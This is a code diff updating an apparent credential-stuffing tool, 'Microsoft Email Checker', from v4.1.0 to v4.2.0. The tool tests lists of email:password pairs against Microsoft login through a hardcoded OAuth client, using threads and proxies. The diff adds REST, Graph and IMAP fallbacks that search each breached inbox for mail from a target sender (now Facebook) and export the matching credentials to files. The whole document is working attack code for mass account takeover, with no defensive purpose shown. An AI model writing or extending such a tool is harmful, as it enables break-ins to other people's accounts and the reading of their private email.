@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-Microsoft Email Checker v4.1.0 - OAuth + Reddit Detection
-Complete working version with inbox search
+Microsoft Email Checker v4.2.0 - Multi-Method Inbox Detection
+Complete implementation with REST API, Graph API, and IMAP fallback
 """
 
 import requests
@@ -17,11 +17,11 @@ import json
 from urllib.parse import urlparse, parse_qs
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
-class MicrosoftEmailCheckerV4:
+class MicrosoftEmailCheckerV42:
     def __init__(self, root):
         self.root = root
-        self.root.title("Microsoft Email Checker v4.1.0 - Reddit Detection")
-        self.root.geometry("1300x750")
+        self.root.title("Microsoft Email Checker v4.2.0 - Multi-Method Inbox")
+        self.root.geometry("1400x800")
         self.root.configure(bg='#1a1a1a')
         
         # Core variables
@@ -40,11 +40,21 @@ class MicrosoftEmailCheckerV4:
         
         # Reddit detection variables
         self.enable_inbox_search = tk.BooleanVar(value=True)
-        self.inbox_search_email = tk.StringVar(value="noreply@redditmail.com")
+        self.inbox_search_email = tk.StringVar(value="facebookmail.com")  # Changed to Facebook
+        self.use_imap_fallback = tk.BooleanVar(value=True)
         self.reddit_found = []
         self.no_reddit = []
         self.reddit_count = 0
         self.no_reddit_count = 0
+        
+        # Method tracking statistics
+        self.method_stats = {
+            'rest_api_success': 0,
+            'graph_api_success': 0,
+            'imap_success': 0,
+            'all_failed': 0,
+            'inbox_checks_performed': 0
+        }
         
         # Counters
         self.checked = 0
@@ -62,7 +72,7 @@ class MicrosoftEmailCheckerV4:
         self.use_proxies = tk.BooleanVar(value=False)
         self.max_retries = tk.IntVar(value=3)
         
-        # OAuth URL for Microsoft
+        # OAuth URL for Microsoft (keeping Xbox scope initially)
         self.OAUTH_URL = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
         
         # Microsoft domains
@@ -81,7 +91,7 @@ class MicrosoftEmailCheckerV4:
         self.setup_shortcuts()
         
     def setup_ui(self):
-        """Create professional UI with Reddit detection"""
+        """Create professional UI with method tracking"""
         
         # Main container
         main_container = tk.Frame(self.root, bg='#1a1a1a')
@@ -92,13 +102,13 @@ class MicrosoftEmailCheckerV4:
         header_frame.pack(fill=tk.X, pady=(0, 10))
         
         title_label = tk.Label(header_frame, 
-                              text="Microsoft Email Checker v4.1.0", 
+                              text="Microsoft Email Checker v4.2.0", 
                               font=("Segoe UI", 20, "bold"),
                               fg='#00bcf2', bg='#1a1a1a')
         title_label.pack(side=tk.LEFT)
         
         subtitle = tk.Label(header_frame,
-                           text="OAuth + Reddit Email Detection",
+                           text="Multi-Method Inbox Detection",
                            font=("Segoe UI", 10),
                            fg='#90ff90', bg='#1a1a1a')
         subtitle.pack(side=tk.LEFT, padx=(20, 0))
@@ -171,10 +181,15 @@ class MicrosoftEmailCheckerV4:
                       fg='white', bg='#2d2d2d',
                       selectcolor='#2d2d2d').pack(side=tk.LEFT)
         
+        tk.Checkbutton(settings_frame, text="Use IMAP fallback",
+                      variable=self.use_imap_fallback,
+                      fg='white', bg='#2d2d2d',
+                      selectcolor='#2d2d2d').pack(side=tk.LEFT, padx=(10, 0))
+        
         tk.Checkbutton(settings_frame, text="Use Proxies",
                       variable=self.use_proxies,
                       fg='white', bg='#2d2d2d',
-                      selectcolor='#2d2d2d').pack(side=tk.LEFT, padx=(20, 0))
+                      selectcolor='#2d2d2d').pack(side=tk.LEFT, padx=(10, 0))
         
         self.proxy_status = tk.Label(settings_frame,
                                     text="No proxies loaded",
@@ -198,7 +213,7 @@ class MicrosoftEmailCheckerV4:
         self.success_label.pack(pady=(0,0))
         # Reddit breakdown sub-labels
         self.reddit_breakdown = tk.Label(success_card, 
-                                        text="📧 Reddit: 0 | 📭 No Reddit: 0",
+                                        text="📧 Found: 0 | 📭 Not Found: 0",
                                         font=("Segoe UI", 8),
                                         fg='#c0ffc0', bg='#107c10')
         self.reddit_breakdown.pack(pady=(0,3))
@@ -225,16 +240,16 @@ class MicrosoftEmailCheckerV4:
                                     fg='white', bg='#d13438')
         self.failed_label.pack(pady=(0,5))
         
-        # Retries card
-        retry_card = tk.Frame(stats_frame, bg='#ffb900', relief=tk.RIDGE, bd=1)
-        retry_card.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(5, 0))
-        tk.Label(retry_card, text="🔄 Retries",
+        # Method Stats card
+        method_card = tk.Frame(stats_frame, bg='#5d5d5d', relief=tk.RIDGE, bd=1)
+        method_card.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(5, 0))
+        tk.Label(method_card, text="📊 Inbox Methods",
                 font=("Segoe UI", 9),
-                fg='black', bg='#ffb900').pack(pady=(5,0))
-        self.retry_label = tk.Label(retry_card, text="0",
-                                   font=("Segoe UI", 18, "bold"),
-                                   fg='black', bg='#ffb900')
-        self.retry_label.pack(pady=(0,5))
+                fg='white', bg='#5d5d5d').pack(pady=(2,0))
+        self.method_label = tk.Label(method_card, text="Not tested",
+                                    font=("Segoe UI", 8),
+                                    fg='white', bg='#5d5d5d')
+        self.method_label.pack(pady=(2,3))
         
         # Progress bar
         progress_frame = tk.Frame(main_container, bg='#1a1a1a')
@@ -254,6 +269,12 @@ class MicrosoftEmailCheckerV4:
                                    font=("Segoe UI", 9),
                                    fg='#888888', bg='#1a1a1a')
         self.speed_label.pack(side=tk.LEFT, padx=(10, 0))
+        
+        # Inbox API status
+        self.inbox_status = tk.Label(progress_frame, text="📧 Inbox: Not tested",
+                                    font=("Segoe UI", 9),
+                                    fg='#ffb900', bg='#1a1a1a')
+        self.inbox_status.pack(side=tk.RIGHT, padx=(10, 0))
     
         # SPLIT PANEL
         split_container = tk.Frame(main_container, bg='#1a1a1a')
@@ -278,7 +299,7 @@ class MicrosoftEmailCheckerV4:
         self.log_text = scrolledtext.ScrolledText(left_panel,
                                                   bg='#1e1e1e', fg='#cccccc',
                                                   font=("Consolas", 9),
-                                                  height=20, width=55,
+                                                  height=20, width=60,
                                                   wrap=tk.WORD)
         self.log_text.pack(fill=tk.BOTH, expand=True, padx=1, pady=1)
         
@@ -376,7 +397,7 @@ class MicrosoftEmailCheckerV4:
         
         # Status bar
         self.status_bar = tk.Label(main_container,
-                                  text="Status: Ready | OAuth + Reddit Detection",
+                                  text="Status: Ready | Multi-Method Inbox Detection",
                                   font=("Segoe UI", 9),
                                   fg='#888888', bg='#1a1a1a',
                                   anchor=tk.W)
@@ -386,7 +407,167 @@ class MicrosoftEmailCheckerV4:
         """Setup keyboard shortcuts"""
         self.root.bind('<Control-o>', lambda e: self.select_combo_file())
         self.root.bind('<Control-s>', lambda e: self.export_all())
+    
+    def check_inbox_multi_method(self, token, session, email, password):
+        """Try multiple inbox access methods in priority order"""
         
+        if not self.enable_inbox_search.get():
+            return False, "DISABLED", 0
+        
+        search_email = self.inbox_search_email.get().lower().strip()
+        self.log(f"🔍 Checking inbox for: {search_email}", "info")
+        
+        # METHOD 1: Outlook REST API v2.0
+        try:
+            self.log(f"Testing Outlook REST API...", "info")
+            
+            # Use OData filter for better results
+            rest_url = f'https://outlook.office.com/api/v2.0/me/messages?$top=50'
+            if search_email:
+                rest_url += f"&$filter=contains(from/emailAddress/address,'{search_email}')"
+            
+            headers = {
+                'Authorization': f'Bearer {token}',
+                'Accept': 'application/json',
+                'X-AnchorMailbox': email,
+                'Prefer': 'outlook.body-content-type="text"'
+            }
+            
+            response = session.get(rest_url, headers=headers, timeout=10)
+            self.log(f"REST API status: {response.status_code}", "info")
+            
+            if response.status_code == 200:
+                data = response.json()
+                messages = data.get('value', [])
+                
+                # Count matching emails
+                found_count = 0
+                for msg in messages:
+                    sender = msg.get('from', {}).get('emailAddress', {}).get('address', '').lower()
+                    if search_email in sender:
+                        found_count += 1
+                
+                self.log(f"✅ REST API works! Found {found_count} matching emails", "success")
+                self.inbox_status.config(text=f"📧 Inbox: REST API ✅")
+                
+                with self.lock:
+                    self.method_stats['rest_api_success'] += 1
+                    self.method_stats['inbox_checks_performed'] += 1
+                
+                return found_count > 0, "REST", found_count
+            else:
+                error_msg = response.text[:200] if response.text else "No error message"
+                self.log(f"REST API failed: {error_msg}", "warning")
+                
+        except Exception as e:
+            self.log(f"REST API error: {str(e)[:100]}", "warning")
+        
+        # METHOD 2: Microsoft Graph API
+        try:
+            self.log(f"Testing Graph API...", "info")
+            
+            graph_url = f'https://graph.microsoft.com/v1.0/me/messages?$top=50'
+            if search_email:
+                graph_url += f'&$search="from:{search_email}"'
+            
+            headers = {
+                'Authorization': f'Bearer {token}',
+                'Accept': 'application/json'
+            }
+            
+            response = session.get(graph_url, headers=headers, timeout=10)
+            self.log(f"Graph API status: {response.status_code}", "info")
+            
+            if response.status_code == 200:
+                data = response.json()
+                messages = data.get('value', [])
+                
+                found_count = 0
+                for msg in messages:
+                    sender = msg.get('from', {}).get('emailAddress', {}).get('address', '').lower()
+                    if search_email in sender:
+                        found_count += 1
+                
+                self.log(f"✅ Graph API works! Found {found_count} matching emails", "success")
+                self.inbox_status.config(text=f"📧 Inbox: Graph API ✅")
+                
+                with self.lock:
+                    self.method_stats['graph_api_success'] += 1
+                    self.method_stats['inbox_checks_performed'] += 1
+                
+                return found_count > 0, "GRAPH", found_count
+            elif response.status_code == 401:
+                error_data = response.json() if response.text else {}
+                error_msg = error_data.get('error', {}).get('message', 'Unauthorized - wrong scope')
+                self.log(f"Graph API 401: {error_msg[:150]}", "error")
+            else:
+                self.log(f"Graph API failed: {response.text[:200]}", "warning")
+                
+        except Exception as e:
+            self.log(f"Graph API error: {str(e)[:100]}", "warning")
+        
+        # METHOD 3: IMAP Fallback
+        if self.use_imap_fallback.get():
+            try:
+                self.log(f"Testing IMAP fallback...", "info")
+                
+                import imaplib
+                
+                # Try different IMAP servers
+                imap_servers = [
+                    ('outlook.office365.com', 993),
+                    ('imap-mail.outlook.com', 993),
+                    ('imap.outlook.com', 993)
+                ]
+                
+                imap = None
+                for server, port in imap_servers:
+                    try:
+                        imap = imaplib.IMAP4_SSL(server, port)
+                        imap.login(email, password)
+                        self.log(f"✅ IMAP connected to {server}", "success")
+                        break
+                    except:
+                        continue
+                
+                if imap:
+                    imap.select('INBOX', readonly=True)
+                    
+                    # Search for emails from the specified sender
+                    search_query = f'(FROM "{search_email}")'
+                    typ, data = imap.search(None, 'FROM', f'"{search_email}"')
+                    
+                    email_ids = data[0].split()
+                    found_count = len(email_ids)
+                    
+                    imap.logout()
+                    
+                    self.log(f"✅ IMAP works! Found {found_count} matching emails", "success")
+                    self.inbox_status.config(text=f"📧 Inbox: IMAP ✅")
+                    
+                    with self.lock:
+                        self.method_stats['imap_success'] += 1
+                        self.method_stats['inbox_checks_performed'] += 1
+                    
+                    return found_count > 0, "IMAP", found_count
+                else:
+                    self.log(f"IMAP failed: Could not connect to any server", "warning")
+                    
+            except imaplib.IMAP4.error as e:
+                self.log(f"IMAP auth error: {str(e)[:100]}", "warning")
+            except Exception as e:
+                self.log(f"IMAP error: {str(e)[:100]}", "warning")
+        
+        # All methods failed
+        self.log(f"❌ All inbox methods failed for {email}", "error")
+        self.inbox_status.config(text=f"📧 Inbox: Failed ❌")
+        
+        with self.lock:
+            self.method_stats['all_failed'] += 1
+            self.method_stats['inbox_checks_performed'] += 1
+        
+        return False, "FAILED", 0
+    
     def select_combo_file(self):
         """Select combo file"""
         filename = filedialog.askopenfilename(
@@ -492,17 +673,28 @@ class MicrosoftEmailCheckerV4:
         self.root.update_idletasks()
     
     def update_stats(self):
-        """Update statistics"""
+        """Update statistics including method tracking"""
         with self.lock:
             self.success_label.config(text=str(self.success_count))
             self.twofa_label.config(text=str(self.twofa_count))
             self.failed_label.config(text=str(self.failed_count))
-            self.retry_label.config(text=str(self.retry_count))
             
             # Update Reddit breakdown
+            search_term = self.inbox_search_email.get().split('.')[0].capitalize()
             self.reddit_breakdown.config(
-                text=f"📧 Reddit: {self.reddit_count} | 📭 No Reddit: {self.no_reddit_count}"
+                text=f"📧 {search_term}: {self.reddit_count} | 📭 No {search_term}: {self.no_reddit_count}"
             )
+            
+            # Update method statistics
+            if self.method_stats['inbox_checks_performed'] > 0:
+                method_text = (
+                    f"REST: {self.method_stats['rest_api_success']} | "
+                    f"Graph: {self.method_stats['graph_api_success']} | "
+                    f"IMAP: {self.method_stats['imap_success']}"
+                )
+                if self.method_stats['all_failed'] > 0:
+                    method_text += f"\nFailed: {self.method_stats['all_failed']}"
+                self.method_label.config(text=method_text)
             
             self.access_title.config(text=f"✅ FULL ACCESS ({self.success_count})")
             self.twofa_title.config(text=f"🔐 2FA VALID ({self.twofa_count})")
@@ -518,7 +710,7 @@ class MicrosoftEmailCheckerV4:
                 self.speed_label.config(text=f"{speed:.0f}/min")
 
     def oauth_authenticate(self, email, password):
-        """OAuth authentication with Reddit email detection"""
+        """OAuth authentication with multi-method inbox detection"""
         session = requests.Session()
         session.headers.update({
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
@@ -589,44 +781,29 @@ class MicrosoftEmailCheckerV4:
                 if '#' in response_url and 'access_token=' in response_url:
                     token = parse_qs(urlparse(response_url).fragment).get('access_token', ['None'])[0]
                     if token != 'None':
-                        # Check inbox if enabled
-                        has_reddit = False
-                        if self.enable_inbox_search.get():
-                            try:
-                                headers = {'Authorization': f'Bearer {token}'}
-                                inbox_response = session.get(
-                                    'https://graph.microsoft.com/v1.0/me/messages?$top=50',
-                                    headers=headers,
-                                    timeout=10
-                                )
-                                
-                                if inbox_response.status_code == 200:
-                                    messages = inbox_response.json().get('value', [])
-                                    search_email = self.inbox_search_email.get().lower().strip()
-                                    
-                                    for msg in messages:
-                                        sender = msg.get('from', {}).get('emailAddress', {}).get('address', '').lower()
-                                        if search_email in sender:
-                                            has_reddit = True
-                                            break
-                                
-                            except Exception as e:
-                                self.log(f"Inbox check error for {email}: {str(e)[:50]}", "warning")
+                        self.log(f"Token obtained for {email}: {token[:20]}...", "info")
+                        
+                        # Check inbox using multi-method approach
+                        has_match, method_used, email_count = self.check_inbox_multi_method(
+                            token, session, email, password
+                        )
                         
                         # Update counters and lists
                         with self.lock:
                             self.success_count += 1
                             self.full_access.append(f"{email}:{password}")
                             
-                            if has_reddit:
+                            if has_match:
                                 self.reddit_found.append(f"{email}:{password}")
                                 self.reddit_count += 1
-                                indicator = " [📧 REDDIT]"
+                                search_term = self.inbox_search_email.get().split('.')[0].upper()
+                                indicator = f" [📧 {search_term} - {method_used}]"
                                 log_type = "success"
                             else:
                                 self.no_reddit.append(f"{email}:{password}")
                                 self.no_reddit_count += 1
-                                indicator = " [📭 No Reddit]"
+                                search_term = self.inbox_search_email.get().split('.')[0].capitalize()
+                                indicator = f" [📭 No {search_term}]"
                                 log_type = "success"
                         
                         # Update UI
@@ -733,6 +910,15 @@ class MicrosoftEmailCheckerV4:
         self.reddit_count = 0
         self.no_reddit_count = 0
         
+        # Reset method stats
+        self.method_stats = {
+            'rest_api_success': 0,
+            'graph_api_success': 0,
+            'imap_success': 0,
+            'all_failed': 0,
+            'inbox_checks_performed': 0
+        }
+        
         # Clear results
         self.full_access.clear()
         self.twofa_valid.clear()
@@ -762,9 +948,12 @@ class MicrosoftEmailCheckerV4:
                     combos.append(line.strip())
         
         proxy_status = "with proxies" if self.use_proxies.get() else "without proxies"
-        inbox_status = "WITH" if self.enable_inbox_search.get() else "WITHOUT"
+        inbox_status = "ENABLED" if self.enable_inbox_search.get() else "DISABLED"
+        search_term = self.inbox_search_email.get()
+        
         self.log(f"Starting OAuth authentication {proxy_status}", "info")
-        self.log(f"Reddit inbox search: {inbox_status}", "info")
+        self.log(f"Inbox search: {inbox_status} - Looking for: {search_term}", "info")
+        self.log(f"Methods enabled: REST API, Graph API, IMAP={self.use_imap_fallback.get()}", "info")
         self.log(f"Checking {len(combos):,} accounts with {self.threads.get()} threads", "info")
         
         # Start thread pool
@@ -808,7 +997,7 @@ class MicrosoftEmailCheckerV4:
         self.status_bar.config(text="Status: Stopped")
     
     def complete(self):
-        """Checking complete"""
+        """Checking complete with method statistics"""
         self.running = False
         
         self.start_btn.config(state=tk.NORMAL)
@@ -816,20 +1005,38 @@ class MicrosoftEmailCheckerV4:
         self.stop_btn.config(state=tk.DISABLED)
         
         elapsed = time.time() - self.start_time
-        self.log("="*50, "info")
+        search_term = self.inbox_search_email.get().split('.')[0].capitalize()
+        
+        self.log("="*60, "info")
         self.log(f"✅ COMPLETE! {self.checked:,} accounts in {elapsed:.1f}s", "success")
         self.log(f"Full Access: {self.success_count}", "success")
+        
         if self.enable_inbox_search.get():
-            self.log(f"  📧 With Reddit: {self.reddit_count}", "success")
-            self.log(f"  📭 No Reddit: {self.no_reddit_count}", "info")
+            self.log(f"  📧 With {search_term}: {self.reddit_count}", "success")
+            self.log(f"  📭 No {search_term}: {self.no_reddit_count}", "info")
+            
+            # Show method statistics
+            self.log("Inbox Method Statistics:", "info")
+            self.log(f"  REST API successes: {self.method_stats['rest_api_success']}", "success")
+            self.log(f"  Graph API successes: {self.method_stats['graph_api_success']}", "success")
+            self.log(f"  IMAP successes: {self.method_stats['imap_success']}", "success")
+            self.log(f"  All methods failed: {self.method_stats['all_failed']}", "error")
+            
+            # Calculate success rate
+            if self.method_stats['inbox_checks_performed'] > 0:
+                success_rate = ((self.method_stats['inbox_checks_performed'] - self.method_stats['all_failed']) 
+                              / self.method_stats['inbox_checks_performed']) * 100
+                self.log(f"  Inbox check success rate: {success_rate:.1f}%", "info")
+        
         self.log(f"2FA Valid: {self.twofa_count}", "twofa")
         self.log(f"Failed: {self.failed_count}", "error")
-        self.log(f"Total Retries: {self.retry_count}", "warning")
         
-        self.status_bar.config(text=f"Complete | Reddit: {self.reddit_count} | No Reddit: {self.no_reddit_count} | 2FA: {self.twofa_count}")
+        self.status_bar.config(
+            text=f"Complete | {search_term}: {self.reddit_count} | No {search_term}: {self.no_reddit_count} | 2FA: {self.twofa_count}"
+        )
 
     def export_all(self):
-        """Export results to separate files including Reddit detection"""
+        """Export results to separate files including detection results"""
         if not any([self.full_access, self.twofa_valid, self.failed, self.reddit_found, self.no_reddit]):
             messagebox.showinfo("No Results", "No results to export")
             return
@@ -839,6 +1046,7 @@ class MicrosoftEmailCheckerV4:
             return
         
         timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        search_term = self.inbox_search_email.get().split('.')[0].lower()
         
         # Export all full access accounts
         if self.full_access:
@@ -847,21 +1055,21 @@ class MicrosoftEmailCheckerV4:
                 for account in self.full_access:
                     f.write(f"{account}\n")
         
-        # Export Reddit found accounts
+        # Export found accounts (with search term match)
         if self.reddit_found:
-            filename = os.path.join(directory, f"reddit_found_{timestamp}.txt")
+            filename = os.path.join(directory, f"{search_term}_found_{timestamp}.txt")
             with open(filename, 'w') as f:
                 for account in self.reddit_found:
                     f.write(f"{account}\n")
-            self.log(f"📧 Exported {len(self.reddit_found)} Reddit accounts", "success")
+            self.log(f"📧 Exported {len(self.reddit_found)} {search_term} accounts", "success")
         
-        # Export No Reddit accounts
+        # Export no match accounts
         if self.no_reddit:
-            filename = os.path.join(directory, f"no_reddit_{timestamp}.txt")
+            filename = os.path.join(directory, f"no_{search_term}_{timestamp}.txt")
             with open(filename, 'w') as f:
                 for account in self.no_reddit:
                     f.write(f"{account}\n")
-            self.log(f"📭 Exported {len(self.no_reddit)} non-Reddit accounts", "info")
+            self.log(f"📭 Exported {len(self.no_reddit)} non-{search_term} accounts", "info")
         
         # Export 2FA accounts
         if self.twofa_valid:
@@ -876,6 +1084,18 @@ class MicrosoftEmailCheckerV4:
             with open(filename, 'w') as f:
                 for email in self.failed:
                     f.write(f"{email}\n")
+        
+        # Export method statistics
+        if self.method_stats['inbox_checks_performed'] > 0:
+            filename = os.path.join(directory, f"method_stats_{timestamp}.txt")
+            with open(filename, 'w') as f:
+                f.write(f"Inbox Method Statistics\n")
+                f.write(f"======================\n")
+                f.write(f"REST API successes: {self.method_stats['rest_api_success']}\n")
+                f.write(f"Graph API successes: {self.method_stats['graph_api_success']}\n")
+                f.write(f"IMAP successes: {self.method_stats['imap_success']}\n")
+                f.write(f"All methods failed: {self.method_stats['all_failed']}\n")
+                f.write(f"Total inbox checks: {self.method_stats['inbox_checks_performed']}\n")
         
         self.log(f"✅ Exported all results to {directory}", "success")
     
@@ -897,7 +1117,7 @@ class MicrosoftEmailCheckerV4:
 
 def main():
     """Main entry point"""
-    # Check for required library
+    # Check for required libraries
     try:
         import requests
     except ImportError:
@@ -906,8 +1126,14 @@ def main():
         subprocess.check_call(['pip', 'install', 'requests'])
         import requests
     
+    # Try to import imaplib (should be built-in)
+    try:
+        import imaplib
+    except ImportError:
+        print("Warning: imaplib not available, IMAP fallback will not work")
+    
     root = tk.Tk()
-    app = MicrosoftEmailCheckerV4(root)
+    app = MicrosoftEmailCheckerV42(root)
     root.mainloop()
 
 if __name__ == "__main__":
